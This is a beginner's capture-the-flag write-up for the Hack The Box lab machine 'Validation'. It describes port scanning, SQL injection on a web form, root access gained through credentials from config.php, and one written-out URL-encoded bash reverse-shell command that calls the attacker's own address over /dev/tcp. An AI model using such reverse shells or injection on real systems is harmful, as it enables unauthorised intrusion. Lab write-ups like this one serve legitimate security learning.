# Validation

This is my write-up for the machine called **Validation** located at: [https://app.hackthebox.com/machines/Validation](https://app.hackthebox.com/machines/Validation).&#x20;

{% hint style="info" %}
I am a beginner at penetration testing, so I will be referencing the Official Hack The Box Walk-through for this machine.
{% endhint %}

rustscan: rustscan -a 10.10.11.116

![](<../../.gitbook/assets/image (349) (1) (1).png>)

Going to port 80, we see this page:

![](<../../.gitbook/assets/image (338) (1) (1) (1).png>)

On Hack The Box, I got a hint from one of the tags from the machine:

![](<../../.gitbook/assets/image (352) (1) (1).png>)

It seems that I need to run some type of SQL Injection on the page. After trying a bunch of SQL queries, I ended up running an nmap scan on the machine, since according to the walk-through, I had missed a bunch of open ports using rust scan:

![](<../../.gitbook/assets/image (350) (1) (1) (1) (1).png>)

After I got stuck, I found [this write-up](https://solomon-sec.com/hack-the-box-validation-walkthrough/) that basically made it understand where the vulnerability was:

![](<../../.gitbook/assets/image (345) (1) (1) (1).png>)

I then got the following output:

![](<../../.gitbook/assets/image (342) (1).png>)

This showed me that this is vulnerable to SQL Injection. Viewing the same write-up, I then changed the parameters to then submit to the website:

![](<../../.gitbook/assets/image (351) (1) (1).png>)

![](<../../.gitbook/assets/image (335) (1) (1).png>)

I then got stuck again and then watched [this video](https://youtu.be/dFKsSYVeVbI) that assisted a bit more in the understanding of what I was messing up on. I found out that I had to run the command to get a shell on the system:

![](<../../.gitbook/assets/image (341) (1) (1) (1).png>)

After I ran this command, I was able to run commands on the system:

![](<../../.gitbook/assets/image (328) (1) (1).png>)

Apparently the IP Addresses of the VPN you are using on HTB can change, which was something I did not know. When I ran **ifconfig**, I understood why my reverse shell command was not working when I tried it. In any case, I got the reverse shell by running the following command (recommended by the official write-up and modified to work for me):

`bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.14/1234+0>%261'`

In order to get this to work though, you have to change your request from GET to POST, which can be done by clicking on the button below:

![](<../../.gitbook/assets/image (340) (1) (1) (1).png>)

You can then submit the command, as seen in the image above. After I had the shell, the first thing I did was find the user.txt file:

![](<../../.gitbook/assets/image (344) (1) (1).png>)

I was trying to find a way to upload **linpeas.sh** or get a way to see what access I had, but I ended up getting nowhere. On the official write-up, the credentials I had seen earlier in config.php, were the credentials for the root user:

![](<../../.gitbook/assets/image (329) (1) (1).png>)

I was then able to get the flag using the root access.
